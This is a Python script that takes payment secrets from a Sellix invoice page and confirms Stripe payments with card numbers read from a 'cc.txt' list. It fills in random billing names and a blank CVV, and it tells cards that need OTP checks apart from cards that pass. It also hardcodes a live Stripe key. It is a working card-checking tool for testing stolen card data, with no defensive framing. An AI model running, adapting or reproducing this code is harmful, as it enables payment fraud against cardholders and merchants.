import random
import re
import requests
import urllib3

urllib3.disable_warnings()


def extract_invoice_info(url):
    match = re.match(r'https?://([a-zA-Z0-9.-]+)/(?:[a-zA-Z0-9.-]+/)?invoice/([^/]+)', url)
    if match:
        groups = match.groups()
        return {
            'domain': groups[0],
            'invoice_id': groups[1]
        }
    else:
        return {
            "error": "Error: Invalid Sellix Invoice URL."
        }


def sellix_info(url):
    url_info = extract_invoice_info(url)

    if url_info.get("error"):
        return url_info
    invoice_id = url_info["invoice_id"]
    domain = url_info["domain"]

    url = f"https://{domain}/api/shop/invoices/{invoice_id}"

    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 "
                      "Mobile Safari/537.36",
        "content-type": "application/json; charset=utf-8",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
    }
    try:
        r = requests.get(url, headers=headers, verify=False)

        if r.status_code != 200:
            return {
                "error": "Error Code: " + str(r.status_code)
            }
        if r.json().get("error"):
            return {
                "error": r.json()["error"]
            }
        info = r.json()["data"]["invoice"]
        data = {
            "domain": domain,
            "invoice_id": invoice_id,
            "email": info.get("customer_email"),
            "pi": info.get("stripe_client_secret"),
            "pk": "pk_live_51JpGudGGvSAAHahB4rQbESNBf5Lm7bUOBLfpzqbithD4MTr9zhWN1SUx134s7MLODCj11W7Y1S7mqrT8iUjdoPah"
                  "00gksKbsKb" if info.get(
                "stripe_publishable_key") in [None, ""] else info.get("stripe_publishable_key"),
            "acc_id": info.get("stripe_user_id")
        }
        return data
    except Exception as e:

        return {
            "error": "Error: " + str(e)
        }


def random_info():
    f = ["Henry", "Charlie", "James", "Chris", "Robert"]
    l = ["Downy", "Johansson", "Smith", "Grey"]
    return {
        "first_name": random.choice(f),
        "last_name": random.choice(l)
    }


def pay_sellix(url, ccn, mon, year, cvv):
    sellix_in = sellix_info(url)
    if sellix_in.get("error"):
        return {
            "error": sellix_in["error"]
        }
    domain = sellix_in["domain"]
    invoice_id = sellix_in["invoice_id"]
    pi_id = "pi_" + sellix_in["pi"].split("_")[1]
    cs_id = "secret_" + sellix_in["pi"].split("_")[3]
    acc_id = sellix_in["acc_id"]
    pk = sellix_in["pk"]
    email = sellix_in["email"]

    rn_info = random_info()
    first_name = rn_info["first_name"]
    last_name = rn_info["last_name"]

    url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 "
                      "Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded",
        "accept": "application/json",
        "referer": "https://js.stripe.com/",
    }
    data = f"return_url=https%3A%2F%2F{domain}%2Finvoice%2F{invoice_id}" \
           f"&payment_method_data[type]=card" \
           f"&payment_method_data[card][number]={ccn}" \
           f"&payment_method_data[card][cvc]={cvv}" \
           f"&payment_method_data[card][exp_year]={year}" \
           f"&payment_method_data[card][exp_month]={mon}" \
           f"&payment_method_data[billing_details][address][country]=IN" \
           f"&payment_method_data[payment_user_agent]=" \
           f"stripe.js%2Fefee6eb491%3B+stripe-js-v3%2Fefee6eb491%3B+payment-element" \
           f"&payment_method_data[referrer]=https%3A%2F%2F{domain}" \
           f"&payment_method_data[time_on_page]=10585" \
           f"&payment_method_data[guid]=NA" \
           f"&payment_method_data[muid]=NA" \
           f"&payment_method_data[sid]=NA" \
           f"&expected_payment_method_type=card" \
           f"&use_stripe_sdk=true&key={pk}" \
           f"&_stripe_account={acc_id}&client_secret={pi_id}_{cs_id}"
    try:
        r = requests.post(url, headers=headers, data=data, verify=False)

        if r.status_code == 200 and r.json().get("status") == "succeeded":
            return True
        elif r.json().get("error"):
            if r.json()["error"]["type"] == "invalid_request_error":
                return {
                    "error": "Error: Expired Invoice."
                }
            else:
                return {
                    "error": "Error: " + r.json()["error"]["message"]
                }

        elif r.status_code == 200 and r.json().get("status") == "requires_action":
            three_d_secure_2_source = r.json()["next_action"]["use_stripe_sdk"]["three_d_secure_2_source"]
        elif r.status_code != 200:
            return {
                "error": "Error: " + r.json()["error"]["message"]
            }
        else:
            return {
                "error": "Error: " + r.json().get("status")
            }
    except Exception as e:
        return {
            "error": "Error: " + str(e)
        }

    url = "https://api.stripe.com/v1/3ds2/authenticate"

    data = f"source={three_d_secure_2_source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22" \
           f"%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22" \
           f"%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-IN%22%2C" \
           f"%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22800%22%2C%22browserScreenWidth%22%3A" \
           f"%22360%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(" \
           f"Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(" \
           f"KHTML%2C+like+Gecko)+Chrome%2F119.0.0.0+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support[" \
           f"hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[" \
           f"spc_eligible]=true&one_click_authn_device_support[" \
           f"webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=" \
           f"{pk}&_stripe_account={acc_id}"
    try:
        r = requests.post(url, headers=headers, data=data, verify=False)

        if r.status_code == 200 and r.json().get("state") == "succeeded":
            pass
        elif r.json()["state"] == "challenge_required":
            return {
                "error": "Error: OTP Required, Change Card."
            }
        elif r.json().get("error"):
            return {
                "error": r.json()["error"]["message"]
            }
        else:
            return {
                "error": "Error: " + r.json().get("state")
            }
    except Exception as e:
        return {
            "error": "Error: " + str(e)
        }

    url = f"https://api.stripe.com/v1/payment_intents/{pi_id}?key={pk}&_stripe_account={acc_id}&is_stripe_sdk=false" \
          f"&client_secret={pi_id}_{cs_id}"

    try:
        r = requests.get(url, headers=headers, verify=False)

        if r.json().get("last_payment_error"):
            k = r.json()["last_payment_error"]
            return {
                "error": "Error: " + k["message"]
            }
        elif r.json().get("error"):
            return {
                "error": "Error: " + r.json()["error"].get("message")
            }
        elif not r.json().get("last_payment_error") and r.json().get("status") != "requires_payment_method":
            return True
        else:
            return {
                "error": "Error: Unknown."
            }

    except Exception as e:
        return {
            "error": "Error: " + str(e)
        }

    return {
        "error": "Error: Unknown Error"
    }


sellix_url = "#"

with open('cc.txt', 'r', encoding='utf-8', errors='ignore') as f:
    ccs = f.read().splitlines()

for cc in ccs:
    if len(cc.split('|')) != 4:
        continue
    cc, mm, yy, cvc = cc.split('|')
    print(pay_sellix(sellix_url, cc, mm, yy, ""))
